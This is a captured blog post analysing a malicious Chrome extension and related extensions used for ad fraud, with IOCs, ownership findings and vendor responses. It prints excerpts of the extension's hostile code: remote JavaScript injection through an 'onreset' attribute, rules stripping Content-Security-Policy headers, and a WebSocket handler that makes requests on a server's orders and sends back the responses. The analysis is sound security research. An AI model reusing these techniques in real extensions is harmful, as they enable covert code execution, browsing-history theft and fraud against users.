---
url: https://palant.info/2025/02/03/analysis-of-an-advanced-malicious-chrome-extension/
captured_at: '2026-04-16'
capture_method: script
source_type: blog
source_id: palant
title_at_capture: Analysis of an advanced malicious Chrome extension | Almost Secure
author: Wladimir Palant
evidence_class: c
topics:
  - security
  - malicious-extensions
  - teardown
wayback_url: >-
  https://web.archive.org/web/20260416224500/https://palant.info/2025/02/03/analysis-of-an-advanced-malicious-chrome-extension/
related_docs: []
notes: Fill in during curation.
---

# Analysis of an advanced malicious Chrome extension | Almost Secure

## Signal extracted

<!-- Fill in during curation. The one insight this post has that's hard to get elsewhere. -->

---

Two weeks ago I published [an article on 63 malicious Chrome extensions](https://palant.info/2025/01/20/malicious-extensions-circumvent-googles-remote-code-ban/). In most cases I could only identify the extensions as malicious. With large parts of their logic being downloaded from some web servers, it wasn’t possible to analyze their functionality in detail.

However, for the Download Manager Integration Checklist extension I have all parts of the puzzle now. This article is a technical discussion of its functionality that somebody tried very hard to hide. I was also able to identify a number of related extensions that were missing from my previous article.

**Update** (2025-02-04): An update to Download Manager Integration Checklist extension has been released a day before I published this article, clearly prompted by me asking adindex about this. The update removes the malicious functionality and clears extension storage. Luckily, I’ve saved both the previous version and its storage contents.

![Screenshot of an extension pop-up. The text in the popup says “Seamlessly integrate the renowned Internet Download Manager (IDM) with Google Chrome, all without the need for dubious third-party extensions” followed up with some instructions.](https://palant.info/2025/02/03/analysis-of-an-advanced-malicious-chrome-extension/popup.png)

#### Contents

-   [The problematic extensions](#the-problematic-extensions)
-   [“Remote configuration” functionality](#remote-configuration-functionality)
-   [The code being executed](#the-code-being-executed)
-   [The “session” handling](#the-session-handling)
-   [Who is behind these extensions?](#who-is-behind-these-extensions)

## [](#the-problematic-extensions)The problematic extensions

Since my previous article I found a bunch more extensions with malicious functionality that is almost identical to Download Manager Integration Checklist. The extension Auto Resolution Quality for YouTube™ does not seem to be malicious (yet?) but shares many remarkable oddities with the other extensions.

Name

Weekly active users

Extension ID

Featured

Freemybrowser

10,000

bibmocmlcdhadgblaekimealfcnafgfn

✓

AutoHD for Twitch™

195

didbenpmfaidkhohcliedfmgbepkakam

Free simple Adult Blocker with password

1,000

fgfoepffhjiinifbddlalpiamnfkdnim

Convert PDF to JPEG/PNG

20,000

fkbmahbmakfabmbbjepgldgodbphahgc

Download Manager Integration Checklist

70,000

ghkcpcihdonjljjddkmjccibagkjohpi

✓

Auto Resolution Quality for YouTube™

223

hdangknebhddccoocjodjkbgbbedeaam

Adblock.mx - Adblock for Chrome

1,000

hmaeodbfmgikoddffcfoedogkkiifhfe

✓

Auto Quality for YouTube™

100,000

iaddfgegjgjelgkanamleadckkpnjpjc

Anti phising safer browsing for chrome

7,000

jkokgpghakemlglpcdajghjjgliaamgc

✓

Darktheme for google translate

40,000

nmcamjpjiefpjagnjmkedchjkmedadhc

✓

Additional IOCs:

-   adblock\[.\]mx
-   adultblocker\[.\]org
-   autohd\[.\]org
-   autoresolutionquality\[.\]com
-   browserguard\[.\]net
-   freemybrowser\[.\]com
-   freepdfconversion\[.\]com
-   internetdownloadmanager\[.\]top
-   megaxt\[.\]com
-   darkmode\[.\]site

## [](#remote-configuration-functionality)“Remote configuration” functionality

The Download Manager Integration Checklist extension was an odd one on the list in [my previous article](https://palant.info/2025/01/20/malicious-extensions-circumvent-googles-remote-code-ban/). It has very minimal functionality: it’s merely supposed to display a set of instructions. This is a task that doesn’t require any permissions at all, yet the extension requests access to all websites and `declarativeNetRequest` permission. Apparently, nobody noticed this inconsistency so far.

Looking at the extension code, there is another oddity. The checklist displayed by the extension is downloaded from Firebase, Google’s online database. Yet there is also a download from `https://help.internetdownloadmanager.top/checklist`, with the response being handled by this function:

```
async function u(l) {
  await chrome.storage.local.set({ checklist: l });

  await chrome.declarativeNetRequest.updateDynamicRules({
    addRules: l.list.add,
    removeRuleIds: l.list.rm,
  });
}
```

This is what I flagged as malicious functionality initially: part of the response is used to add `declarativeNetRequest` rules dynamically. At first I missed something however: the rest of the data being stored as `checklist` is also part of the malicious functionality, allowing execution of remote code:

```
function f() {
  let doc = document.documentElement;
  function updateHelpInfo(info, k) {
    doc.setAttribute(k, info);
    doc.dispatchEvent(new CustomEvent(k.substring(2)));
    doc.removeAttribute(k);
  }

  document.addEventListener(
    "description",
    async ({ detail }) => {
      const response = await chrome.runtime.sendMessage(
        detail.msg,
      );
      document.dispatchEvent(
        new CustomEvent(detail.responseEvent, {
          detail: response,
        }),
      );
    },
  );

  chrome.storage.local.get("checklist").then(
    ({ checklist }) => {
      if (checklist && checklist.info && checklist.core) {
        updateHelpInfo(checklist.info, checklist.core);
      }
    },
  );
}
```

There is a [tabs.onUpdated](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/tabs/onUpdated) listener hidden within the legitimate `webextension-polyfill` module that will run this function for every web page via [tabs.executeScript API](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/tabs/executeScript).

This function looks fairly unsuspicious. Understanding its functionality is easier if you know that `checklist.core` is `"onreset"`. So it takes the document element, fills its `onreset` attribute with some JavaScript code from `checklist.info`, triggers the `reset` event and removes the attribute again. That’s how this extension runs some server-provided code in the context of every website.

## [](#the-code-being-executed)The code being executed

When the extension downloads its “checklist” immediately after installation the server response will be empty. Sort of: “nothing to see here, this is merely some dead code somebody forgot to remove.” The server sets a cookie however, allowing it to recognize the user on subsequent downloads. And only after two weeks or so it will respond with the real thing. For example, the `list` key of the response looks like this then:

```
"add": [
  {
    "action": {
      "responseHeaders": [
        {
          "header": "Content-Security-Policy-Report-Only",
          "operation": "remove"
        },
        {
          "header": "Content-Security-Policy",
          "operation": "remove"
        }
      ],
      "type": "modifyHeaders"
    },
    "condition": {
      "resourceTypes": [
        "main_frame"
      ],
      "urlFilter": "*"
    },
    "id": 98765432,
    "priority": 1
  }
],
"rm": [
  98765432
]
```

No surprise here, this is about removing [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) protection from all websites, making sure it doesn’t interfere when the extension injects its code into web pages.

As I already mentioned, the `core` key of the response is `"onreset"`, an essential component towards executing the JavaScript code. And the JavaScript code in the `info` key is heavily obfuscated by [JavaScript Obfuscator](https://github.com/javascript-obfuscator/javascript-obfuscator/), with most strings and property names encrypted to make reverse engineering harder.

Of course this kind of obfuscation can still be reversed, and you can see the entire deobfuscated code [here](https://palant.info/2025/02/03/analysis-of-an-advanced-malicious-chrome-extension/payload.txt). Note that most function and variable names have been chosen randomly, the original names being meaningless. The code consists of three parts:

1.  Marshalling of various extension APIs: [tabs](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/tabs), [storage](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/storage), [declarativeNetRequest](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/declarativeNetRequest). This uses DOM events to communicate with the [function f() mentioned above](#remote-configuration-functionality), this function forwards the messages to the extension’s background worker and the worker then calls the respective APIs.
    
    In principle, this allows reading out your entire browser state: how many tabs, what pages are loaded etc. Getting notified on changes is possible as well. The code doesn’t currently use this functionality, but the server can of course produce a different version of it any time, for all users or only for selected targets.
    
    There is also another aspect here: in order to run remote code, this code has been moved into the website realm. This means however that any website can abuse these APIs as well. It’s only a matter of knowing which DOM events to send. Yes, this is a massive security issue.
    
2.  Code downloading a 256 KiB binary blob from `https://st.internetdownloadmanager.top/bff` and storing it in encoded form as `bff` key in the extension storage. No, this isn’t your best friend forever but a [Bloom filter](https://en.wikipedia.org/wiki/Bloom_filter). This filter is applied to SHA-256 hashes of domain names and determines on which domain names the main functionality should be activated.
    
    With Bloom filters, it is impossible to determine which exact data went into it. It is possible however to try out guesses, to see which one it accepts. [Here](https://palant.info/2025/02/03/analysis-of-an-advanced-malicious-chrome-extension/domains.txt) is the list of matching domains that I could find. This list looked random to me initially, and I even suspected that noise has been added to it in order to hide the real target domains. Later however I could identify it as the list of adindex advertisers, see below.
    
3.  The main functionality: when active, it sends the full address of the current page to `https://st.internetdownloadmanager.top/cwc2` and might get a “session” identifier back. It is likely that this this server stores the addresses it receives and sells the resulting browsing history. This part of the functionality stays hidden however.
    
    The “session” handling is visible on the other hand. There is some rate limiting here, making sure that this functionality is triggered at most once per minute and no more than once every 12 hours for each domain. If activated, a message is sent back to the extension’s background worker telling it to connect to `wss://pa.internetdownloadmanager.top/s/<session>`. All further processing happens there.
    

## [](#the-session-handling)The “session” handling

Here we are back in the extension’s static code, no longer remotely downloaded code. The entry point for the “session” handling is function `__create`. Its purpose has been concealed, with some essential property and method names contained in the obfuscated code above or received from the web socket connection. I filled in these parts and simplified the code to make it easier to understand:

```
var __create = url => {
  const socket = new this.WebSocket(url);
  const buffer = {};
  socket.onmessage = event => {
    let message = event.data.arrayBuffer ? event.data : JSON.parse(event.data);
    this.stepModifiedMatcher(socket, buffer, message)
  };
};

stepModifiedMatcher =
  async (socket, buffer, message) => {
    if (message.arrayBuffer)
      buffer[1] = message.arrayBuffer();
    else {
      let [url, options] = message;
      if (buffer[1]) {
        options.body = await buffer[1];
        buffer[1] = null;
      }

      let response = await this.fetch(url, options);
      let data = await Promise.all([
        !message[3] ? response.arrayBuffer() : false,
        JSON.stringify([...response.headers.entries()]),
        response.status,
        response.url,
        response.redirected,
      ]);
      for (const entry of data) {
        if (socket.readyState === 1) {
          socket.send(entry);
        }
      }
    }
  };
```

This receives instructions from the web socket connection on what requests to make. Upon success the extension sends information like response text, HTTP headers and HTTP status back to the server.

What is this good for? Before I could observe this code in action I was left guessing. Is this an elaborate approach to de-anonymize users? On some websites their name will be right there in the server response. Or is this about session hijacking? There would be session cookies in the headers and CSRF tokens in the response body, so the extension could be instrumented to perform whatever actions necessary on behalf of the attackers – like initiating a money transfer once the user logs into their PayPay account.

The reality turned out to be far more mundane. When I finally managed to trigger this functionality on the Ashley Madison website, I saw the extension perform lots of web requests. Apparently, it was replaying a browsing session that was recorded two days earlier with the Firefox browser. The entry point of this session: `https://api.sslcertifications.org/v1/redirect?advertiserId=11EE385A29E861E389DA14DDA9D518B0&adspaceId=11EE4BCA2BF782C589DA14DDA9D518B0&customId=505` (redirecting to `ashleymadison.com`).

![Developer Tools screenshot, listing a number of network requests. It starts with ashleymadison.com and loads a number of JavaScript and CSS files as well as images. All requests are listed as fetch requests initiated by background.js:361.](https://palant.info/2025/02/03/analysis-of-an-advanced-malicious-chrome-extension/session_replay.png)

The server handling `api.sslcertifications.org` belongs to the German advertising company adindex. Their list of advertisers is mostly identical to the list of domains matched by the Bloom filter the extension uses. So this is ad fraud: the extension generates fake link clicks, making sure its owner earns money for “advertising” websites like Ashley Madison. It uses the user’s IP address and replays recorded sessions to make this look like legitimate traffic, hoping to avoid detection this way.

I contacted adindex and they confirmed that `sslcertifications.org` is a domain registered by a specific publisher but handled by adindex. They also said that they confronted the publisher in question with my findings and, having found their response unsatisfactory, blocked this publisher. Shortly afterwards the `internetdownloadmanager.top` domain became unreachable, and `api.sslcertifications.org` site no longer has a valid SSL certificate. Domains related to other extensions, the ones I didn’t mention in my request, are still accessible.

## [](#who-is-behind-these-extensions)Who is behind these extensions?

The adindex CEO declined to provide the identity of the problematic publisher. There are obvious data protection reasons for that. However, as I looked further I realized that he might have additional reasons to withhold this information.

While most extensions I list provide clearly fake names and addresses, the Auto Quality for YouTube™ extension is associated with the MegaXT website. That website doesn’t merely feature a portfolio of two browser extensions (the second one being an older Manifest V2 extension also geared towards running remote code) but also a real owner with a real name. Who just happens to be a developer at adindex.

There is also the company eokoko GmbH, developing Auto Resolution Quality for YouTube™ extension. This extension appears to be non-malicious at the moment, yet it shares a number of traits with the malicious extensions on my list. Director of this company is once again the same adindex developer.

And not just any developer. According to his website he used to be CTO at adindex in 2013 (I couldn’t find an independent confirmation for this). He also founded a company together with the adindex CEO in 2018, something that is confirmed by public records.

When I mentioned this connection in my communication with adindex CEO the response was:

> \[He\] works for us as a freelancer in development. Employees (including freelancers) are generally not allowed to operate publisher accounts at adindex and the account in question does not belong to \[this developer\]. Whether he operates extensions is actually beyond my knowledge.

I want to conclude this article with some assorted history facts:

-   The two extensions associated with MegaXT have been running remote code since at least 2021. I don’t know whether they were outright malicious from the start, this would be impossible to prove retroactively even with source code given that they simply loaded some JavaScript code into the extension context. But both extensions have reviews complaining about malicious functionality going back to 2022.
-   Darktheme for google translate and Download Manager Integration Checklist extensions both appear to have changed hands in 2024, after which they requested more privileges with an update in October 2024.
-   Download Manager Integration Checklist extension used to be called “IDM Integration Module” in 2022. There have been at least five more extensions with similar names (not counting the official one), all removed from Chrome Web Store due to “policy violation.” This particular extension was associated with a website which is still offering “cracks” that show up as malware on antivirus scans (the installation instructions “solve” this by recommending to turn off antivirus protection). But that’s most likely the previous extension owner.
-   Convert PDF to JPEG/PNG appears to have gone through a hidden ownership change in 2024, after which an update in September 2024 requested vastly extended privileges. However, the extension has reviews complaining about spammy behavior going back to 2019.

## Curator notes

<!-- Empty at capture time. -->
